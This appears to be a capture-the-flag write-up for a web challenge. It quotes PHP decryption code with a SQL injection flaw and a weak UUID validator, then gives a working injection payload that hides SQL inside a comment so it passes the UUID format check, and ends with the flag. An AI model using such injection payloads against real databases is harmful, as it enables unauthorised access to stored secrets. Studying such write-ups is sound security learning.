# Sokosoko Secure Uploader

> Description
> ---
> I encrypted my file by using this [service](#). Attachment is the encrypted file, but I accidentally deleted the UUID of the file. All I remember is the UUID starts with 9e5a :(
>   
> - [flag.png.encrypted]
> - [src.zip]
> 
> (Web, 100 points)

## Description
We are given the URL of the [service](#) where we can decrypt an encrypted image and the information about the UUID prefix `9e5a` needed to decrypt the image.

![site.png]

We are also provided with [src.zip] archive containing a source code of the entire site and with the file [flag.png.encrypted], which as the name suggests is an encrypted image of the searched flag.   

# Solution
By a quick look at the [decrypt.php], I noticed a possibility of the `SQL Injection` inside `UUID POST data`.

```php
$uuid = $_POST['uuid'];
if (!is_string($uuid) || !is_uuid($uuid)) {
  die('invalid UUID');
}
⋮
$stmt = $pdo->query("SELECT key FROM decryption_key WHERE id = '$uuid'");
```
However, there is a function inside [functions.php] validating the correctness of the `UUID` input.

```php
function is_uuid($str) {
  if (strlen($str) !== 36) {
    return false;
  }
  if ($str[8] !== '-' or $str[13] !== '-' or $str[18] !== '-' or $str[23] !== '-') {
    return false;
  }
  return true;
}
```

So, we are forced to make an injection in `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` format.  
We would like to use the given information about UUID needed to decrypt the image, so our query should look like `SELECT id LIKE '9e5a%'`.  
Comes out that we can do it by the following input: `'OR id/*-aaaa-aaaa-aaaa-*/LIKE'9e5a%`, which after uploading in tandem with the [flag.png.encrypted] returns an image with the flag inside.

Flag: **HarekazeCTF{k41k4n_j1kk4n_j1n615uk4n}**

[src.zip]:<./files>
[flag.png.encrypted]: <./files/flag.png.encrypted>
[decrypt.php]: <./files/decrupt.php>
[functions.php]:<./files/functions.php>
[site.png]:<./files/site.png>
